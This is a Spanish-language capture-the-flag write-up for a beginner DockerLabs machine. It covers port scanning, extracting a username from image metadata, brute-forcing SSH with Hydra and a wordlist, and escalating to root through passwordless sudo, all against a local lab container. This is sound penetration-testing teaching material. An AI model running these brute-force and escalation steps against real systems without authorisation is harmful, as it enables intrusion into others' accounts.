# 🖥️ **Máquina: BorazuwarahCTF**  
- **🔹 Dificultad:** Muy Fácil  
- **📌 Descripción:**  
  Esta máquina de DockerLabs está diseñada para practicar técnicas básicas de explotación, incluyendo fuerza bruta con Hydra, análisis de metadatos y escalada de privilegios mediante SSH. Es ideal para principiantes que desean familiarizarse con herramientas comunes de pentesting.  

- **🎯 Objetivo:**  
  - Identificar credenciales mediante fuerza bruta.  
  - Analizar metadatos de archivos para encontrar información sensible.  
  - Escalar privilegios en el sistema.  

![Logo de BorazuwarahCTF](/BorazuwarahCTF/Imagenes/Logo.png)  

---

## 🚀 **Despliegue de la Máquina BorazuwarahCTF en DockerLabs**  

Para iniciar la máquina, sigue estos pasos:  

### 1️⃣ **Ejecutar el despliegue automático**  
Ejecuta el siguiente comando para desplegar la máquina:  

```bash
sudo bash auto_deploy.sh borazwarabctf.tar
```  

📌 **Nota:** Asegúrate de tener Docker configurado correctamente.  

![Máquina Iniciada](/BorazuwarahCTF/Imagenes/Activar.jpeg)  

Una vez iniciada, verifica la conexión con:  

```bash
ping -c4 172.17.0.2
```  
![ping](/BorazuwarahCTF/Imagenes/Ping.jpeg)  

---

## 🔍 **Reconocimiento**  

### Escaneo de Puertos  
Se identificaron los puertos abiertos con Nmap:  

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports.txt
```  

**Puertos abiertos:**  
- **22/tcp (SSH)**  
- **80/tcp (HTTP)**  

![Resultado del Escaneo](/BorazuwarahCTF/Imagenes/Escaneo.jpeg)  

### Servicios Detectados  
Se utilizó Nmap para obtener más detalles de los servicios que corren en los puertos:  

```bash
nmap -sCV -p22,80 172.17.0.2 -oN target.txt
```  

**Resultados:**  
- **SSH:** OpenSSH 9.2p1  
- **HTTP:** Apache 2.4.59  

![Servicios Detectados](/BorazuwarahCTF/Imagenes/Servicios.jpeg)  

---

## 🛠️ **Pagina Web**  
Revise la pagina web que estaba corriendo en el puerto :80, pero no se encontro nada relevante use las herramientas de gobuster,wfuzz revise la pagina con whatweb y procedi a revisar la imagen.

![Pagina](/BorazuwarahCTF/Imagenes/Pagina.jpeg)  

---

## 🛠️ **Exploracion de la imagen**  

### Metadatos
Descargue la imagen con el comando:  

```bash
wget http://172.17.0.2/imagen.jpeg
```
Con la imagen descargada se prcedio ha revisar su metadata donde se encontro un usuario que procedi a usar Hydra para intentar encontrar su contraseña para el servicio de SSH ya que en la etapa de reconocimeto encontramos que el puerto 22 estava activo.

```bash
exiftool imagen.jpeg
```  

![Metadatos](/BorazuwarahCTF/Imagenes/Metadatos.jpeg)  

---
## 🛠️ **Explotación**  

### Fuerza Bruta con Hydra  
Se empleó Hydra para encontrar credenciales SSH:  

```bash
hydra -l borazunarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 20
```  

**Credenciales encontradas:**  
- **Usuario:** `borazunarah`  
- **Contraseña:** `123456`  

![Resultado de Hydra](/BorazuwarahCTF/Imagenes/Hydra.jpeg)  

### Conexión SSH  
Se accedió al sistema con las credenciales obtenidas:  

```bash
ssh borazunarah@172.17.0.2
```  

### Escalada de Privilegios  
Se verificaron los permisos de sudo:  

```bash
sudo -l
```  

**Resultado:**  
- El usuario puede ejecutar `/bin/bash` como root sin contraseña.  

```bash
sudo /bin/bash
```  

![Escalada de Privilegios](/BorazuwarahCTF/Imagenes/SSH.jpeg)  

---

## 📌 **Conclusión**  
Esta máquina permitió practicar técnicas básicas de pentesting, desde reconocimiento hasta explotación y escalada de privilegios. Se destacó la importancia de:  
- Verificar permisos de sudo.  
- Analizar metadatos en archivos públicos.  
- Utilizar herramientas como Hydra para ataques de fuerza bruta.  
